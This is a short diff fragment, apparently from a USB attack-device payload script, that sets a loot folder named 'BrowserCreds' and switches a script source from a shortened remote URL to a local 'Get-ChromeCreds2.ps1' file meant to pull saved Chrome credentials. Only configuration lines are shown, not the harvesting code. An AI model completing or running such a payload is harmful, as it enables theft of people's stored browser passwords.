@@ -18,7 +18,7 @@
 LED R 200
 LOOTDIR=/root/udisk/loot/BrowserCreds
 
-SCRIPT="https://bit.ly/2qeXsAf"
+SCRIPT="Path\To\Get-ChromeCreds2.ps1"
 
 mkdir -p $LOOTDIR
 
